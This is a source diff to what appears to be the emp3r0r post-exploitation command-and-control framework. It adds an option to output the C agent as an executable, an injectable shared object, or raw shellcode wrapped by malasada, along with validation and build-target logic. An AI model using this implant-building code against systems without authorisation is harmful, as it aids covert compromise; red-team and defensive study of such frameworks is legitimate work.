@@ -5,9 +5,11 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"slices"
 	"time"
 
 	"github.com/google/uuid"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/tools"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/lib/cagent"
@@ -32,6 +34,10 @@ var (
 	// LIBC picks the C library the hosted agent links: glibc (pinned via
 	// GLIBC_VERSION) or musl (zig's bundled musl, stable ABI).
 	CAgentLibcs = []string{"glibc", "musl"}
+	// CAgentFormats selects the artifact the build produces: a hosted
+	// executable, a shared object (dlopen/injection), or the shared object
+	// wrapped as malasada raw PIC (shellcode).
+	CAgentFormats = []string{"exe", "so", "shellcode"}
 )
 
 // CAgentProviders selects the providers the built C agent links. Empty fields
@@ -44,6 +50,7 @@ type CAgentProviders struct {
 	Dynload   string // DYNLOAD_MODE=
 	Glibc     string // GLIBC_VERSION=
 	Libc      string // LIBC=
+	Format    string // exe|so|shellcode (post-build artifact)
 }
 
 // cAgentProviderSpec maps one operator choice to its Makefile variable. A
@@ -145,7 +152,20 @@ func validateCAgentProviders(p CAgentProviders) error {
 	if p.Libc == "musl" && p.Dynload != "" && p.Dynload != "public" {
 		return fmt.Errorf("libc musl only provides the public dl* symbols; use dynload=public")
 	}
+	if p.Format != "" && !slices.Contains(CAgentFormats, p.Format) {
+		return fmt.Errorf("invalid format %q (available: %v)", p.Format, CAgentFormats)
+	}
 	return nil
+}
+
+// cAgentMakeTarget maps a format to the Makefile target that produces its
+// intermediate artifact: the executable, or the shared object that malasada
+// wraps for raw PIC.
+func cAgentMakeTarget(format string) string {
+	if format == "so" || format == "shellcode" {
+		return "so"
+	}
+	return "agent"
 }
 
 // cAgentBuildArgs is the deterministic `make` argument vector for the on-demand
@@ -154,7 +174,7 @@ func validateCAgentProviders(p CAgentProviders) error {
 // pure so it can be unit tested without invoking make.
 func cAgentBuildArgs(srcDir, configSrc string, p CAgentProviders) []string {
 	args := []string{
-		"-C", srcDir, "agent",
+		"-C", srcDir, cAgentMakeTarget(p.Format),
 		"CONFIG_SRC=" + configSrc,
 	}
 	for _, spec := range cAgentProviderSpecs(p) {
@@ -232,16 +252,37 @@ func GenerateCAgentWorkflow(opts AgentConfig, providers CAgentProviders, signAge
 		return nil, fmt.Errorf("build C agent: %w\n%s", buildErr, out)
 	}
 
+	// The executable and the shared object are distinct make outputs; raw PIC is
+	// the shared object wrapped by malasada.
 	built := filepath.Join(buildDir, "c2_agent")
+	if cAgentMakeTarget(providers.Format) == "so" {
+		built = filepath.Join(buildDir, "c2_agent.so")
+	}
 	if !util.IsFileExist(built) {
 		return nil, fmt.Errorf("build reported success but %s was not produced", built)
 	}
+
 	now := time.Now()
 	outFile := filepath.Join(live.EmpWorkSpace, fmt.Sprintf("aquila_linux_%d-%d-%d_%d-%d-%d",
 		now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second()))
-	data, err := os.ReadFile(built)
-	if err != nil {
-		return nil, fmt.Errorf("read built C agent: %w", err)
+	var data []byte
+	switch providers.Format {
+	case "so":
+		outFile += ".so"
+		if data, err = os.ReadFile(built); err != nil {
+			return nil, fmt.Errorf("read built C agent: %w", err)
+		}
+	case "shellcode":
+		// malasada turns the PIC shared object into a loader-wrapped raw PIC
+		// blob; the exported entry is main (see c2_agent.c).
+		outFile += ".bin"
+		if data, err = tools.ConvertSharedObjectToShellcode(built, "main", true); err != nil {
+			return nil, fmt.Errorf("convert C agent to shellcode: %w", err)
+		}
+	default:
+		if data, err = os.ReadFile(built); err != nil {
+			return nil, fmt.Errorf("read built C agent: %w", err)
+		}
 	}
 	if err := os.WriteFile(outFile, data, 0o755); err != nil {
 		return nil, fmt.Errorf("write C agent: %w", err)
